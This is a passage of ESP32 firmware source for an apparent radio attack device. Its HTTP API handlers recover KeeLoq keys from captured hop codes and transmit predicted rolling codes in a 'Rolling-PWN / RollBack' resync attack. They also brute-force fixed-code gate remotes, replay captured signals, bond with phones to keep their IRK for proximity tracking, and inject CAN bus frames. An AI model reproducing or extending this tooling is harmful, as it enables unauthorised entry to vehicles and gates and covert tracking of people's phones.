      if(m) anyMatch=true;
      char dh[20]; snprintf(dh,20,"%08lX%08lX",(unsigned long)(mfrKey>>32),(unsigned long)(mfrKey&0xFFFFFFFFUL));
      char decs[12]; snprintf(decs,12,"0x%08lX",(unsigned long)dec);
      out+="{\"mode\":\"simple\",\"learn\":\"simple\",\"dev_key\":\""+String(dh)+"\",\"dec\":\""+String(decs)+"\",\"match\":"+(m?"true":"false")+"},";
    }
    // Every derived mode, from the shared derivation helper.
    {
      uint64_t dk[N_KL_DERIV_MODES];
      ks_deriveOneMfrKey(sn32, mfrKey, dk);
      for(uint8_t m=0;m<N_KL_DERIV_MODES;m++){
        uint32_t dec=ks_klDecrypt(hop,dk[m]);
        bool hit=ks_klSnMatch(dec,sn32);
        if(hit) anyMatch=true;
        char dh[20]; snprintf(dh,20,"%08lX%08lX",(unsigned long)(dk[m]>>32),(unsigned long)(dk[m]&0xFFFFFFFFUL));
        char decs[12]; snprintf(decs,12,"0x%08lX",(unsigned long)dec);
        out+="{\"mode\":\""+String(KL_MODE_NAME[m])+"\",\"learn\":\""+String(ks_klLearnName(KL_MODE_LEARN[m]))+"\",\"dev_key\":\""+String(dh)+"\",\"dec\":\""+String(decs)+"\",\"match\":"+(hit?"true":"false")+"},";
      }
    }
    // Remove trailing comma from last array element, close array
    if(out.endsWith(",")) out.remove(out.length()-1);
    out += "]}";
    // Patch any_match field
    if(anyMatch) out.replace("\"any_match\":false","\"any_match\":true");
    srv.send(200,"application/json",out);
  });

  // /api/add_user_key?n=<label>&k=<16hex>[&family=<0-4>]
  // Save a manufacturer key to NVS (same as serial key_add command, but HTTP).
  protectedRoute("/api/add_user_key",[](){
    String name=srv.arg("n"); if(name.length()==0) name="UserKey";
    String khex=srv.arg("k"); uint64_t k=0;
    uint8_t fam=(uint8_t)srv.arg("family").toInt();
    if(!ks_parseHex64(khex.c_str(),k)){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"bad-hex\"}"); return;
    }
    int slot=ks_addUserKey(name.c_str(),k,fam);
    char kout[20]; snprintf(kout,20,"%08lX%08lX",(unsigned long)(k>>32),(unsigned long)(k&0xFFFFFFFFUL));
    srv.send(200,"application/json","{\"ok\":"+String(slot>=0?"true":"false")+
      ",\"slot\":"+String(slot)+",\"key\":\""+String(kout)+"\",\"name\":\""+name+"\"}");
  });

  // /api/del_user_key?i=<slot>
  protectedRoute("/api/del_user_key",[](){
    int idx=srv.arg("i").toInt(); bool ok=ks_delUserKey(idx);
    srv.send(200,"application/json","{\"ok\":"+String(ok?"true":"false")+",\"i\":"+String(idx)+"}");
  });

  // /api/clear_user_keys — erase all NVS manufacturer keys (HTTP equivalent of serial key_clear)
  protectedRoute("/api/clear_user_keys",[](){
    // Accidental-wipe guard: require ?confirm=ERASE before erasing all saved keys.
    if(srv.arg("confirm") != "ERASE"){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"confirm-required\",\"note\":\"append ?confirm=ERASE to wipe all keys\"}");
      return;
    }
    ks_clearUserKeys();
    srv.send(200,"application/json","{\"ok\":true}");
  });

  // /api/list_user_keys — list all NVS-stored manufacturer keys
  protectedRoute("/api/list_user_keys",[](){
    srv.send(200,"application/json",ks_userKeysJson());
  });

  // ── Protocol / vehicle-make filter ─────────────────────────────────────────
  // GET /api/set_filter?proto=KeeLoq          — filter to named protocol
  // GET /api/set_filter?vehicle=Toyota        — filter to vehicle make
  // GET /api/set_filter?clear=1               — clear all filters
  // proto and vehicle are mutually exclusive; setting one clears the other.
  protectedRoute("/api/set_filter",[](){
    bool clr = (srv.hasArg("clear") && (srv.arg("clear")=="1"||srv.arg("clear")=="true"));
    if(clr){ filterProto=""; filterVehicle=""; }
    else {
      if(srv.hasArg("proto"))  { filterProto=srv.arg("proto");   filterVehicle=""; }
      if(srv.hasArg("vehicle")){ filterVehicle=srv.arg("vehicle"); filterProto=""; }
    }
    srv.send(200,"application/json",
      "{\"ok\":true,\"filter_proto\":\""+filterProto+"\",\"filter_vehicle\":\""+filterVehicle+"\"}");
  });

  // GET /api/cap_mode?fsk=1  — switch CC1101 to 2FSK demodulation (KIA/HYU V0)
  // GET /api/cap_mode?fsk=0  — restore OOK capture (default)
  // /api/key_recover_offline?hops=HEX1,HEX2,HEX3&sn=12345678&btn=1
  // Synchronous offline key recovery over WiFi — supply captured hop values from
  // the browser library. Runs the full wordlist search and returns the result immediately.
  protectedRoute("/api/key_recover_offline",[](){
    String hopsStr = srv.hasArg("hops") ? srv.arg("hops") : "";
    if(!hopsStr.length()){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"no-hops\",\"event\":\"key_recover_result\"}");
      return;
    }
    uint32_t sn32 = (uint32_t)srv.arg("sn").toInt();
    uint8_t  btn8 = (uint8_t)srv.arg("btn").toInt();
    ks_krCancel();
    KR.got = 0; KR.need = 0; KR.startedMs = millis();
    int idx = 0;
    while(idx <= (int)hopsStr.length() && KR.got < KR_MAX_FRAMES){
      int comma = hopsStr.indexOf(',', idx);
      String hs = (comma < 0) ? hopsStr.substring(idx) : hopsStr.substring(idx, comma);
      hs.trim();
      if(hs.length()){
        uint64_t tmp = 0; ks_parseHex64(hs.c_str(), tmp);
        KLFrame fr; fr.sn = sn32; fr.hop = (uint32_t)tmp; fr.btn = btn8; fr.sts = 0; fr.rawCtr = 0;
        KR.frames[KR.got++] = fr;
      }
      if(comma < 0) break;
      idx = comma + 1;
    }
    if(KR.got < 2){
      srv.send(200,"application/json","{\"ok\":false,\"error\":\"need-min-2-hops\",\"event\":\"key_recover_result\"}");
      return;
    }
    KR.need = KR.got; // offline: don't escalate, we already have all frames
    krLastResultJson = "";
    ks_krAnalyze();
    srv.send(200,"application/json",
      krLastResultJson.length() ? krLastResultJson :
      "{\"ok\":false,\"error\":\"no-result\",\"event\":\"key_recover_result\"}");
  });

  protectedRoute("/api/cap_mode",[](){
    if(srv.hasArg("fsk")){
      String v=srv.arg("fsk");
      fskCapMode=(v=="1"||v=="true");
    }
    srv.send(200,"application/json",
      "{\"ok\":true,\"fsk\":"+String(fskCapMode?"true":"false")+"}");
  });

  // /api/sub_export — export the last capture as a FOBworks RAW pulse file.
  // Returns plain text. Save it with a .sub extension if a pulse tool expects that name.
  protectedRoute("/api/sub_export",[](){
    if(rfLen<4){srv.send(400,"text/plain","");return;}
    uint32_t hz=(uint32_t)(rfFreq*1e6f+0.5f);
    String out="Filetype: FOBworks RAW File\r\nVersion: 1\r\n";
    out+="Frequency: "+String(hz)+"\r\n";
    out+="Preset: FOBworks-OOK-270\r\n";
    out+="Protocol: RAW\r\nRAW_Data:";
    { String rs; rawAppendPulses(rs,rfBuf,rfLen,512,rfStartHigh); out+=rs; }
    out+="\r\n";
    // State the polarity so a consumer (or a future reader) does not have to
    // infer it. The reference convention: positive duration = HIGH.
    out+="# polarity: first pulse is "+String(rfStartHigh?"HIGH":"LOW")+"\r\n";
    srv.sendHeader("Content-Disposition","attachment; filename=\"fob_"+String(rfFreq,2)+"MHz.sub\"");
    srv.send(200,"text/plain",out);
  });

  // /api/resync_probe?freq=315.0&proto=KeeLoq&sn=12345&ctr=1000&te=400&btn=0&n=16
  // Rolling-PWN / RollBack resync probe: transmit N consecutive predicted codes.
  // Requires ≥2 sequential captures in FOBclone so ctr and delta are resolved.
  protectedRoute("/api/resync_probe",[](){
    float    mhz=(srv.hasArg("freq"))?srv.arg("freq").toFloat():rfFreq;
    String   proto=srv.hasArg("proto")?srv.arg("proto"):String("KeeLoq");
    uint32_t sn=(uint32_t)srv.arg("sn").toInt();
    int32_t  startCtr=srv.arg("ctr").toInt();
    uint16_t te=(uint16_t)(srv.hasArg("te")?srv.arg("te").toInt():360);
    uint8_t  btn=(uint8_t)(srv.hasArg("btn")?srv.arg("btn").toInt():0);
    int      n=srv.hasArg("n")?srv.arg("n").toInt():16; n=max(4,min(n,64));
    static uint16_t pb[300]; int sent=0; bool ok=true;
    for(int i=0;i<n&&ok;i++){
      uint32_t c=(uint32_t)(startCtr+(int32_t)i);
      int nl=buildForProto(proto,sn,c,te,btn,pb,300);
      if(nl>0){ok=replayRaw(mhz,pb,nl,1);delay(30);sent++;}
    }
    srv.send(200,"application/json",
      "{\"ok\":"+String(ok?"true":"false")+",\"sent\":"+String(sent)+"}");
  });

  // /api/fixed_bruteforce?proto=EV1527&addr=AABBCC&btn=0&range=256&freq=315.0&te=360
  // Sequential OOK fixed-code burst ±range/2 around addr — for EV1527/PT2262 gates.
  protectedRoute("/api/fixed_bruteforce",[](){
    float    mhz=(srv.hasArg("freq"))?srv.arg("freq").toFloat():rfFreq;
    String   proto=srv.hasArg("proto")?srv.arg("proto"):String("EV1527");
    uint32_t baseAddr=(uint32_t)strtoul(srv.arg("addr").c_str(),nullptr,16);
    uint8_t  btn=(uint8_t)(srv.hasArg("btn")?srv.arg("btn").toInt():0);
    int      range=srv.hasArg("range")?srv.arg("range").toInt():256;
    range=max(4,min(range,1024));
    uint16_t te=(uint16_t)(srv.hasArg("te")?srv.arg("te").toInt():360);
    static uint16_t bb[300]; int sent=0; bool ok=true;
    for(int i=-range/2;i<=range/2&&ok;i++){
      uint32_t tryAddr=(uint32_t)((int32_t)baseAddr+i);
      int nl=buildForProto(proto,tryAddr,0,te,btn,bb,300);
      if(nl>0){ok=replayRaw(mhz,bb,nl,1);delay(20);sent++;}
      if(sent%50==0) yield();
    }
    srv.send(200,"application/json",
      "{\"ok\":"+String(ok?"true":"false")+",\"sent\":"+String(sent)+"}");
  });

  // /api/fast_hop?en=1&dwell=80  — enable/disable fast-hop scan mode.
  // When on, scanDwellMs() returns fastHopDwellMs for every channel so the
  // full automotive band cycles faster at the expense of per-channel linger time.
  protectedRoute("/api/fast_hop",[](){
    bool en=srv.hasArg("en")?(srv.arg("en")!="0"&&srv.arg("en")!="false"):!fastHopActive;
    if(srv.hasArg("dwell")){int d=srv.arg("dwell").toInt();if(d>=30&&d<=2000)fastHopDwellMs=(uint16_t)d;}
    fastHopActive=en;
    srv.send(200,"application/json",
      "{\"ok\":true,\"fast_hop\":"+String(en?"true":"false")+",\"dwell\":"+String(fastHopDwellMs)+"}");
  });

  // POST /api/sub_replay  (body = FOBworks RAW file content)
  // Parses Frequency: and RAW_Data: lines and replays them at the captured frequency.
  protectedRoute("/api/sub_replay",HTTP_POST,[](){
    if(isMultipartRequest()){
      resetSubReplayBody();
      srv.send(415,"application/json","{\"ok\":false,\"error\":\"plain .sub body required\"}");
      return;
    }
    if(subReplayBodyTooLarge||srv.clientContentLength()>(int)SUB_REPLAY_MAX_BODY_BYTES){
      resetSubReplayBody();
      srv.sendHeader("Connection","close");
      srv.send(413,"application/json",
               "{\"ok\":false,\"error\":\"body too large\",\"max_bytes\":"+String(SUB_REPLAY_MAX_BODY_BYTES)+"}");
      return;
    }
    if(!subReplayBodyStarted||subReplayBodyAborted){
      resetSubReplayBody();
      srv.send(400,"application/json","{\"ok\":false,\"error\":\"incomplete body\"}");
      return;
    }
    uint16_t* sb=impStage;   // shared body stage (`research/24` §2): single loop task, no re-entry
    float mhz;
    int sc;
    bool hasRawData=parseSubReplayBody(subReplayBody,mhz,sb,sc);
    resetSubReplayBody();
    if(!hasRawData){srv.send(400,"application/json","{\"ok\":false,\"error\":\"no RAW_Data\"}");return;}
    if(sc<4){srv.send(400,"application/json","{\"ok\":false,\"error\":\"too few pulses\"}");return;}
    bool ok=replayRaw(mhz,sb,sc,3);
    srv.send(200,"application/json",
      "{\"ok\":"+String(ok?"true":"false")+",\"pulses\":"+String(sc)+",\"mhz\":"+String(mhz,2)+"}");
  },receiveSubReplayBody);

  // POST /api/fbk_import  (body = FOBworks RAW or a .sub capture file)
  // Loads a stored frame into fbkBuf so C2 can be armed without a live capture. Same body
  // format as /api/sub_replay, same trim and decoder as a capture (research/22 §3).
  protectedRoute("/api/fbk_import",HTTP_POST,[](){
    if(isMultipartRequest()){
      resetSubReplayBody();
      srv.send(415,"application/json","{\"ok\":false,\"error\":\"plain .sub body required\"}");
      return;
    }
    if(subReplayBodyTooLarge||srv.clientContentLength()>(int)SUB_REPLAY_MAX_BODY_BYTES){
      resetSubReplayBody();
      srv.sendHeader("Connection","close");
      srv.send(413,"application/json",
               "{\"ok\":false,\"error\":\"body too large\",\"max_bytes\":"+String(SUB_REPLAY_MAX_BODY_BYTES)+"}");
      return;
    }
    if(!subReplayBodyStarted||subReplayBodyAborted){
      resetSubReplayBody();
      srv.send(400,"application/json","{\"ok\":false,\"error\":\"incomplete body\"}");
      return;
    }
    uint16_t* ib=impStage;   // shared body stage
    float mhz; int ic;
    bool hasRawData=parseSubReplayBody(subReplayBody,mhz,ib,ic);
    resetSubReplayBody();
    if(!hasRawData){srv.send(400,"application/json","{\"ok\":false,\"error\":\"no RAW_Data\"}");return;}
    String err;
    bool ok=fbkImportFrame(ib,ic,mhz,true,err);
    String body="{\"ok\":"+String(ok?"true":"false")+
      ",\"pulses\":"+String(ic)+",\"mhz\":"+String(mhz,2)+
      ",\"held\":"+String(fbkCount)+",\"max\":"+String(FBK_MAX)+
      ",\"searched\":"+String(ic);
    if(!ok) body+=",\"reason\":\""+err+"\"";
    else {
      FbkEntry& e=fbkBuf[fbkCount-1];
      body+=",\"idx\":"+String(fbkCount-1)+",\"len\":"+String(e.len)+
            ",\"trimmed\":"+String(e.trimmed?"true":"false")+
            ",\"has_ctr\":"+String(e.hasCtr?"true":"false")+
            ",\"ctr\":"+String(e.ctr);
    }
    // research/23 §2.2: name WHERE the frame was found. Without this a refusal gives no
    // hint whether the body was wrong or the search too narrow.
    body+=",\"anchor_index\":"+String(impLastAnchor)+
          ",\"payload_pulses\":"+String(fbkCount>0?fbkBuf[fbkCount-1].len:0);
    body+="}";
    srv.send(ok?200:400,"application/json",body);
  },receiveSubReplayBody);

  // /api/ble_scan?duration=5  — start a passive BLE advertisement scan.
  // Non-blocking: returns {"status":"scanning"} immediately.
  // Poll /api/ble_results for the device list.
  protectedRoute("/api/ble_scan",[](){
    if(!bleInited){srv.send(503,"application/json","{\"error\":\"BLE not ready\"}");return;}
    if(bleScanBusy){srv.send(200,"application/json","{\"status\":\"scanning\"}");return;}
    int dur=5;
    if(srv.hasArg("duration")){int d=srv.arg("duration").toInt();if(d>=1&&d<=30)dur=d;}
    bleScanReady=false; bleScanBusy=true; bleDevCount=0;
    BLEScan* ps=BLEDevice::getScan();
    if(!bleCbInst) bleCbInst=new BleAdCb();
    ps->setAdvertisedDeviceCallbacks(bleCbInst,false);
    ps->setActiveScan(false);
    ps->setInterval(449); ps->setWindow(449);
    ps->start(dur,bleOnScanDone,false);
    srv.send(200,"application/json",
      "{\"status\":\"scanning\",\"duration\":"+String(dur)+"}");
  });

  // /api/ble_results — return device list from most recent BLE scan.
  protectedRoute("/api/ble_results",[](){
    String j="{\"status\":";
    j+=bleScanBusy?"\"scanning\"":(bleScanReady?"\"ready\"":"\"idle\"");
    j+=",\"count\":"; j+=bleDevCount;
    j+=",\"ts\":"; j+=bleLastScanMs;
    j+=",\"devices\":[";
    for(int i=0;i<bleDevCount;i++){
      if(i) j+=",";
      String nm(bleDevs[i].name);
      nm.replace("\\","\\\\"); nm.replace("\"","\\\"");
      j+="{\"addr\":\""; j+=bleDevs[i].addr;
      j+="\",\"name\":\""; j+=nm;
      j+="\",\"rssi\":"; j+=bleDevs[i].rssi;
      j+=",\"uuids\":\""; j+=bleDevs[i].uuids;
      j+="\",\"mfr\":\""; j+=bleDevs[i].mfrHex;
      j+="\",\"system\":\""; j+=bleDevs[i].system;
      j+="\"}";
    }
    j+="]}";
    srv.send(200,"application/json",j);
  });

  // /api/ble_pair_start — advertise as BLE GATT server so a phone can bond with us.
  // After bonding, the phone's IRK is stored in the ESP32 bond table (NVS flash).
  // iOS uses Resolvable Private Addresses (RPA); only the IRK lets us resolve them
  // back to the same device in subsequent scans → proximity tracking.
  protectedRoute("/api/ble_pair_start",[](){
    if(!bleInited){srv.send(503,"application/json","{\"error\":\"BLE not ready\"}");return;}
    if(bleScanBusy){BLEDevice::getScan()->stop();bleScanBusy=false;delay(80);}
    blePairMode=true; blePairDone=false; blePairStartMs=(uint32_t)millis();
    if(!bleSecCbInst) bleSecCbInst=new BleSecCb();
    BLEDevice::setSecurityCallbacks(bleSecCbInst);
    BLESecurity* ps=new BLESecurity();
    ps->setAuthenticationMode(ESP_LE_AUTH_BOND);
    ps->setCapability(ESP_IO_CAP_NONE);
    ps->setInitEncryptionKey(ESP_BLE_ENC_KEY_MASK|ESP_BLE_ID_KEY_MASK);
    ps->setRespEncryptionKey(ESP_BLE_ENC_KEY_MASK|ESP_BLE_ID_KEY_MASK);
    BLEDevice::createServer(); // needed to enable GATT server role
    BLEAdvertising* pAdv=BLEDevice::getAdvertising();
    pAdv->addServiceUUID(BLEUUID((uint16_t)0x180D)); // Heart Rate — accepted by iOS w/o app
    pAdv->setScanResponse(true);
    pAdv->setMinPreferred(0x06);
    pAdv->start();
    addLog("[BLE] Pairing server started — waiting for device to bond");
    srv.send(200,"application/json","{\"status\":\"pairing\",\"name\":\"SGP Card Mini\"}");
  });

  // /api/ble_pair_status — poll pairing state.
  protectedRoute("/api/ble_pair_status",[](){
#if !defined(ESP_ARDUINO_VERSION_MAJOR) || ESP_ARDUINO_VERSION_MAJOR < 3
    int n=bleInited?esp_ble_get_bond_device_num():0; if(n<0) n=0;
#else
    int n=0;
#endif
    String j="{\"mode\":"; j+=blePairMode?"\"pairing\"":"\"idle\"";
    j+=",\"done\":"; j+=blePairDone?"true":"false";
    j+=",\"bonded\":"; j+=n;
    j+=",\"last_addr\":\""; j+=blePairLastAddr; j+="\"";
    j+=",\"elapsed\":"; j+=blePairMode?(uint32_t)(millis()-blePairStartMs):0UL;
    j+="}";
    srv.send(200,"application/json",j);
  });

  // /api/ble_pair_stop — stop GATT advertising.
  protectedRoute("/api/ble_pair_stop",[](){
    if(blePairMode){BLEDevice::getAdvertising()->stop();blePairMode=false;}
    srv.send(200,"application/json","{\"status\":\"stopped\"}");
  });

  // /api/ble_paired_devices — list non-secret bonded-device metadata.
  // Never expose bond keys here: an IRK can resolve a phone's rotating private
  // Bluetooth address and would enable persistent tracking outside this device.
  protectedRoute("/api/ble_paired_devices",[](){
#if !defined(ESP_ARDUINO_VERSION_MAJOR) || ESP_ARDUINO_VERSION_MAJOR < 3
    int n=bleInited?esp_ble_get_bond_device_num():0; if(n<0) n=0;
    esp_ble_bond_dev_t* bl=nullptr;
    if(n>0){
      bl=(esp_ble_bond_dev_t*)malloc(n*sizeof(esp_ble_bond_dev_t));
      if(bl) esp_ble_get_bond_device_list(&n,bl); else n=0;
    }
    String j="{\"count\":"; j+=n; j+=",\"devices\":[";
    for(int i=0;i<n&&bl;i++){
      if(i) j+=",";
      char ab[18]; snprintf(ab,18,"%02X:%02X:%02X:%02X:%02X:%02X",
        bl[i].bd_addr[0],bl[i].bd_addr[1],bl[i].bd_addr[2],
        bl[i].bd_addr[3],bl[i].bd_addr[4],bl[i].bd_addr[5]);
      j+="{\"addr\":\""; j+=ab;
      j+="\",\"addr_type\":"; j+=bl[i].bd_addr_type;
      j+="}";}
    if(bl) free(bl);
    j+="]}";
#else
    // esp_gap_ble_api.h not resolved — bond list unavailable on this core version.
    String j="{\"count\":0,\"devices\":[],\"note\":\"bond-list API unavailable\"}";
#endif
    srv.send(200,"application/json",j);
  });

  // /api/can_init?tx=17&rx=16&baud=500000 — install ESP32 TWAI driver.
  // Requires external transceiver: SN65HVD230, TJA1050, or MCP2551.
  // Pins are fixed to the board-approved pair; validation occurs before any
  // active driver is stopped so malformed requests cannot disrupt operation.
  protectedRoute("/api/can_init",[](){
    uint32_t requestedTx=CAN_SAFE_TX_PIN;
    uint32_t requestedRx=CAN_SAFE_RX_PIN;
    uint32_t baud=500000;
    if(srv.hasArg("tx")&&!parseStrictUint32(srv.arg("tx"),0,48,requestedTx)){
      srv.send(400,"application/json","{\"ok\":false,\"error\":\"invalid_tx_pin\"}");
      return;
    }
    if(srv.hasArg("rx")&&!parseStrictUint32(srv.arg("rx"),0,48,requestedRx)){
      srv.send(400,"application/json","{\"ok\":false,\"error\":\"invalid_rx_pin\"}");
      return;
    }
    if(requestedTx!=CAN_SAFE_TX_PIN||requestedRx!=CAN_SAFE_RX_PIN){
      srv.send(400,"application/json",
        "{\"ok\":false,\"error\":\"unsafe_can_pins\",\"required_tx\":17,\"required_rx\":16}");
      return;
    }
    if(srv.hasArg("baud")&&!parseStrictUint32(srv.arg("baud"),1,1000000,baud)){
      srv.send(400,"application/json","{\"ok\":false,\"error\":\"invalid_baud\"}");
      return;
    }
    twai_timing_config_t tCfg;
    switch(baud){
      case 125000:  tCfg=TWAI_TIMING_CONFIG_125KBITS(); break;
      case 250000:  tCfg=TWAI_TIMING_CONFIG_250KBITS(); break;
      case 500000:  tCfg=TWAI_TIMING_CONFIG_500KBITS(); break;
      case 1000000: tCfg=TWAI_TIMING_CONFIG_1MBITS();   break;
      default:
        srv.send(400,"application/json","{\"ok\":false,\"error\":\"unsupported_baud\"}");
        return;
    }
    if(canInited&&requestedTx==canTxPin&&requestedRx==canRxPin&&baud==canBaud){
      srv.send(200,"application/json",
        "{\"ok\":true,\"status\":\"already_initialized\",\"tx\":"+String(canTxPin)
        +",\"rx\":"+String(canRxPin)+",\"baud\":"+String(canBaud)+"}");
      return;
    }
    if(canActive){twai_stop();canActive=false;}
    if(canInited){twai_driver_uninstall();canInited=false;delay(20);}
    twai_general_config_t gCfg=TWAI_GENERAL_CONFIG_DEFAULT(
      (gpio_num_t)requestedTx,(gpio_num_t)requestedRx,TWAI_MODE_NORMAL);
    twai_filter_config_t fCfg=TWAI_FILTER_CONFIG_ACCEPT_ALL();
    esp_err_t e=twai_driver_install(&gCfg,&tCfg,&fCfg);
    if(e!=ESP_OK){
      srv.send(500,"application/json",
        String("{\"error\":\"twai_driver_install: ")+esp_err_to_name(e)+"\"}");
      return;
    }
    canTxPin=requestedTx; canRxPin=requestedRx; canBaud=baud;
    canInited=true; canBufHead=0; canBufCount=0; canFrameTotal=0;
    addLog("[CAN] TWAI init: TX="+String(canTxPin)+" RX="+String(canRxPin)
           +" baud="+String(baud));
    srv.send(200,"application/json",
      "{\"ok\":true,\"tx\":"+String(canTxPin)+",\"rx\":"+String(canRxPin)
      +",\"baud\":"+String(baud)+"}");
  });

  // /api/can_start — start TWAI receive.
  protectedRoute("/api/can_start",[](){
    if(!canInited){srv.send(503,"application/json","{\"error\":\"not initialized\"}");return;}
    if(canActive){srv.send(200,"application/json","{\"ok\":true,\"status\":\"already active\"}");return;}
    esp_err_t e=twai_start();
    if(e!=ESP_OK){srv.send(500,"application/json","{\"error\":\"twai_start failed\"}");return;}
    canActive=true; addLog("[CAN] TWAI started");
    srv.send(200,"application/json","{\"ok\":true,\"status\":\"active\"}");
  });

  // /api/can_stop — stop TWAI receive.
  protectedRoute("/api/can_stop",[](){
    if(canActive){twai_stop();canActive=false;}
    srv.send(200,"application/json","{\"ok\":true,\"status\":\"stopped\"}");
  });

  // /api/can_frames — return status + all frames in the ring buffer (last 60).
  protectedRoute("/api/can_frames",[](){
    String j="{\"inited\":"; j+=canInited?"true":"false";
    j+=",\"active\":";   j+=canActive?"true":"false";
    j+=",\"tx_pin\":";   j+=canTxPin;
    j+=",\"rx_pin\":";   j+=canRxPin;
    j+=",\"total\":";    j+=canFrameTotal;
    j+=",\"frames\":[";
    int n=min(canBufCount,CAN_BUF_SZ);
    int start=(canBufHead-n+CAN_BUF_SZ)%CAN_BUF_SZ;
    for(int i=0;i<n;i++){
      if(i) j+=",";
      CanFrame& f=canBuf[(start+i)%CAN_BUF_SZ];
      j+="{\"id\":\""; j+=f.id;
      j+="\",\"ext\":";  j+=f.ext?"true":"false";
      j+=",\"rtr\":";    j+=f.rtr?"true":"false";
      j+=",\"dlc\":";    j+=f.dlc;
      j+=",\"data\":\""; j+=f.data;
      j+="\",\"ts\":";   j+=f.ts;
      j+=",\"delta\":0}";}
    j+="]}";
    srv.send(200,"application/json",j);
  });

  // /api/can_send?id=7DF&data=02010C00000000 — transmit a standard or extended frame.
  // Note: TWAI_MODE_NORMAL required. In listen-only mode transmit returns ESP_ERR_NOT_SUPPORTED.
  protectedRoute("/api/can_send",[](){
    if(!canActive){srv.send(503,"application/json","{\"error\":\"CAN not active\"}");return;}
    String idStr=srv.hasArg("id")?srv.arg("id"):"";
    // Validate the id strictly before parsing it. strtoul() stops at the first non-hex
    // character and returns what it got, so "7DFZZZ" parsed as 0x7DF and "7DF" with any
    // trailing junk was accepted silently. Reject anything that is not purely hex (after an
    // optional 0x prefix) so a typo is reported instead of transmitted as a different id.
    {
      String h=idStr;
      if(h.startsWith("0x")||h.startsWith("0X")) h=h.substring(2);
      if(h.length()==0||h.length()>8) {
        srv.send(400,"application/json","{\"error\":\"bad id\",\"detail\":\"id must be 1-8 hex digits, optionally 0x-prefixed\"}");
        return;
      }
      for(size_t i=0;i<h.length();i++){
        char c=h[i];
        bool hexOk=(c>='0'&&c<='9')||(c>='a'&&c<='f')||(c>='A'&&c<='F');
        if(!hexOk){
          srv.send(400,"application/json","{\"error\":\"bad id\",\"detail\":\"id must be 1-8 hex digits, optionally 0x-prefixed\"}");
          return;
        }
      }
    }
    uint32_t id=(uint32_t)strtoul(idStr.c_str()+(idStr.startsWith("0x")||idStr.startsWith("0X")?2:0),nullptr,16);
    bool ext=false;
    if(id>0x1FFFFFFF){srv.send(400,"application/json","{\"error\":\"bad id\"}");return;}
    if(id>0x7FF) ext=true;
    twai_message_t msg; memset(&msg,0,sizeof(msg));
    msg.identifier=id; msg.extd=ext?1:0;
    String data=srv.hasArg("data")?srv.arg("data"):"";
    int nb=0;
    for(int i=0;i+1<(int)data.length()&&nb<8;i+=2){
      char h[3]={data[i],data[i+1],0};
      msg.data[nb++]=(uint8_t)strtoul(h,nullptr,16);
    }
    msg.data_length_code=nb;
    esp_err_t e=twai_transmit(&msg,pdMS_TO_TICKS(200));
    bool ok=(e==ESP_OK);
    String note="";
    if(e==ESP_ERR_NOT_SUPPORTED) note=",\"note\":\"re-init without listen_only to transmit\"";
    // Echo the PARSED id as a canonical hex string, never the raw query text. The raw value
    // went into the JSON unescaped, so a quote or backslash in ?id= could alter the document
    // (the non-hex input is now rejected above, but echoing the number removes the class
    // rather than relying on that check alone).
    char idHex[12]; snprintf(idHex,sizeof(idHex),"0x%lX",(unsigned long)id);
    srv.send(200,"application/json",
      "{\"ok\":"+String(ok?"true":"false")+",\"id\":\""+String(idHex)
      +"\",\"bytes\":"+String(nb)+note+"}");
  });

  // Captive-portal catch-all: redirect any unrecognised URL to the dashboard.
  // iOS/Android detect the captive portal by fetching a known URL (e.g.
  // /hotspot-detect.html, /generate_204) and following the redirect.
  srv.onNotFound([](){
    if(srv.uri().startsWith("/api/")){
      if(!requireRequestAuth()) return;
      srv.send(404,"application/json","{\"ok\":false,\"error\":\"not_found\"}");
      return;
    }
    srv.sendHeader("Location","http://192.168.4.1/",true);
    srv.send(302,"text/plain","");
  });
}

// ─── Serial JSON Command Handler ──────────────────────────────────────────────
static void processCommandLine(const String& ln){
  if(ln.length()<3||ln[0]!='{') return;

  JsonDocument jcmd;
  DeserializationError jerr=deserializeJson(jcmd,ln);
  if(jerr!=DeserializationError::Ok){
    // Report rather than discard in silence. A parse failure used to `continue` with no
    // output, so a malformed or too-large command looked identical to a dropped line --
    // the same silent-failure class as the 255-char cap and the swallowed import. The
    // bench spent several rounds bisecting payload sizes because of it.
    serialEmit(String("{\"ok\":false,\"error\":\"bad-json\",\"detail\":\"")+jerr.c_str()+
               "\",\"line_bytes\":"+String(ln.length())+
               ",\"heap_free\":"+String(ESP.getFreeHeap())+
               ",\"heap_max_alloc\":"+String(ESP.getMaxAllocHeap())+"}");
    return;
  }
  String op=jcmd["cmd"]|"";
  if(!serialTokenMatches(jcmd)){
    serialEmit("{\"ok\":false,\"error\":\"unauthorized\"}");
    return;
  }

  if(op=="status"){
    int ku=0; for(int i=0;i<MAX_KEYS;i++) if(keys[i].used) ku++;
    stackSample();
    serialEmit("{\"cmd\":\"status\",\"stack_hwm\":"
      +String(stackHwmMinBytes==0xFFFFFFFFu?0:stackHwmMinBytes)
      +",\"stack_hwm_after_decode\":"+String(stackHwmAfterDecode)
      +",\"reset_reason\":\""+resetReasonStr+"\""
      +",\"heap_free\":"+String(ESP.getFreeHeap())
      +",\"heap_max_alloc\":"+String(ESP.getMaxAllocHeap())
      +",\"heap_min\":"+String(ESP.getMinFreeHeap())
      +",\"freq\":"+String(curFreq,2)+
      ",\"batt_v\":"+String(battV,3)+",\"batt_pct\":"+String(battPct,1)+
      ",\"scan\":"+String(scanActive?"true":"false")+
      ",\"uptime\":"+String(millis())+
      ",\"cc1101\":"+String(cc1101OK?"true":"false")+
      ",\"sweep_min\":"+String(sweepMin,2)+
      ",\"sweep_max\":"+String(sweepMax,2)+
      ",\"cap_range_min\":"+String(capRangeMin,2)+
      ",\"cap_range_max\":"+String(capRangeMax,2)+
      ",\"keys_used\":"+String(ku)+
      ",\"kl_selftest\":"+String(klSelfTestOK?"true":"false")+
      ",\"kl_selftest_pass\":"+String(klSelfTestPass)+
      ",\"kl_deriv_ok\":"+String(klDerivOK?"true":"false")+
      ",\"kl_deriv_pass\":"+String(klDerivPass)+
      ",\"kl_parse_ok\":"+String(klParseOK?"true":"false")+
      ",\"kia_v34_ok\":"+String(kiaV34SelfTestOK?"true":"false")+"}");
  }
  else if(op=="capture"){
    // Pause sweep so it can't clobber the frequency mid-capture.
    bool wasScan=scanActive; scanActive=false;
    // Optional frequency override: { "cmd":"capture", "f":433.92 }
    if(jcmd.containsKey("f")){
      float ff=(float)jcmd["f"];
      if(ff>=200&&ff<=950){ curFreq=ff; }
    }
